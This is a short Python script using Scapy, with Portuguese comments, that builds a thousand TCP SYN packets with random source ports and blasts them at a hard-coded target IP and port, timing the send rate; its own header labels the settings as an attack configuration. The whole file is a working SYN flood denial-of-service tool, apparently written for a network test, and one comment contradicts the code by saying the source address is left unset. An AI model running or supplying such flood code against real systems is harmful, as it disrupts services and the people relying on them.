from scapy.all import *
import time
import random

# CONFIGURAÇÃO DO ATAQUE
TARGET_IP = "150.164.10.101"
TARGET_PORT = 50005
NUMERO_DE_PACOTES = 1000 # Aumente para um teste mais intenso

def run_tcp_syn_flood():
    """Envia uma rajada de pacotes TCP SYN usando o IP real da máquina."""
    print(f"Preparando {NUMERO_DE_PACOTES} pacotes SYN para {TARGET_IP}:{TARGET_PORT}...")
    
    lista_de_pacotes = []
    for i in range(NUMERO_DE_PACOTES):
        # IMPORTANTE: Não definimos o 'src' no IP(). Scapy usará o IP correto.
        ip_layer = IP(src="150.164.10.126", dst=TARGET_IP)
        tcp_layer = TCP(sport=RandShort(), dport=TARGET_PORT, flags='S')
        
        # Usamos sendp() porque construímos o pacote desde a Camada 2 (Ether)
        # Se não precisar especificar a camada 2, poderia usar send() com o pacote IP()/TCP()
        packet = Ether() / ip_layer / tcp_layer
        lista_de_pacotes.append(packet)

    print("Iniciando o envio rápido dos pacotes...")
    start_time = time.perf_counter()
    
    # Use a sua interface de rede correta aqui! Verifique com 'ip addr' ou 'ifconfig'
    sendpfast(lista_de_pacotes, iface="enp0s3")
    #wrpcap("tcp_syn_reflection.pcap", lista_de_pacotes) 
    
    end_time = time.perf_counter()
    duration = end_time - start_time

    print(f"\nEnvio concluído.")
    print(f"{NUMERO_DE_PACOTES} pacotes enviados em {duration:.4f} segundos.")
    print(f"Taxa: {NUMERO_DE_PACOTES / duration:.2f} pacotes/segundo.")

if __name__ == "__main__":
    run_tcp_syn_flood()

# sudo PYTHONPATH=$HOME/scapy python3 tcp_syn_reflection.py